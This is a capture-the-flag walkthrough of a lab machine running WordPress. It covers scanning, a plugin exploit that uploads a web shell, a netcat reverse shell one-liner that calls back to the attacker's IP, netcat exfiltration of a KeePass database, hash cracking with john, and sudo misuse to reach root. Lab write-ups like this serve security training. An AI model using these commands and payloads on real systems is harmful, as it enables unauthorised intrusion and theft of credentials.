1. Reconnaissance
sudo nmap -T5 -p- -vv 10.10.99.225

Result:
22/tcp open  ssh  
80/tcp open  http
Conclusion:
The server is running SSH (port 22) and HTTP (port 80). The primary focus is the web server.

2. Web Server Exploration
Directory Enumeration (ffuf)
Command:
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.10.99.225/FUZZ

Found:
/wordpress → WordPress site
WordPress Scanning (wpscan)
Command:
wpscan --url http://10.10.99.225/wordpress/ --enumerate vp,u
Result:
WordPress version: 6.4.3 (vulnerable)
Users: admin, everest, montblanc, chooyu, k2
Conclusion:
The WordPress instance is vulnerable. The user k2 seems promising for further access.

3. WordPress Exploitation
http://10.10.99.225/wordpress/wp-login.php
Credentials:
Username: k2
Password: th3_tall3st_password_in_th3_world (found in an email via Roundcube)

Plugin Exploitation (CVE-2021-24145)
Command:
Edit
python3 exploit.py -T 10.10.99.225 -P 80 -U /wordpress/ -u k2 -p th3_tall3st_password_in_th3_world
Result:
css
[+] Shell Uploaded to: http://10.10.99.225/wordpress/wp-content/uploads/shell.php

4. Reverse Shell Access
Netcat Listener
nc -lvnp 9001
Trigger Shell via Web Interface:
http://10.10.99.225/wordpress/wp-content/uploads/shell.php

Payload:
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.10.15.194 9001 >/tmp/f
Result:
www-data@mountaineer:~/html/wordpress/wp-content/uploads$

python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm

5. Privilege Escalation
Searching for Interesting Files:
ls -la /home
/home/lhotse/Backup.kdbx → KeePass database
Transferring the KeePass File to Kali
nc -lvnp 9001 > Backup.kdbx

On the server:
nc 10.10.15.194 9001 < /home/lhotse/Backup.kdbx
Cracking KeePass

Extracting the hash:
keepass2john Backup.kdbx > keepass.hash
Brute-forcing the password:
john --wordlist=passwords.txt keepass.hash

Password Found

Opening the database in KeePassXC:

🏆 6. Gaining Root Access
Switching to user kangchenjunga:
su kangchenjunga
Password:....

Checking sudo permissions:
sudo -l
Result:
(ALL) NOPASSWD: /usr/bin/backup_script.sh
Exploiting the backup script:
sudo /usr/bin/backup_script.sh
Root access gained.
Flag: THM{You_Conquered_The_Tallest_Mountain}

Conclusion
By chaining vulnerabilities in WordPress and KeePass, I was able to gain root access on the target machine. The key attack vectors were:

An outdated version of WordPress with vulnerable plugins.

A weak password stored in a KeePass database.

Sensitive information retrieved from email (Roundcube) helped unlock KeePass.

Misconfigured sudo permissions enabled full privilege escalation.

Flag:THM{********************}
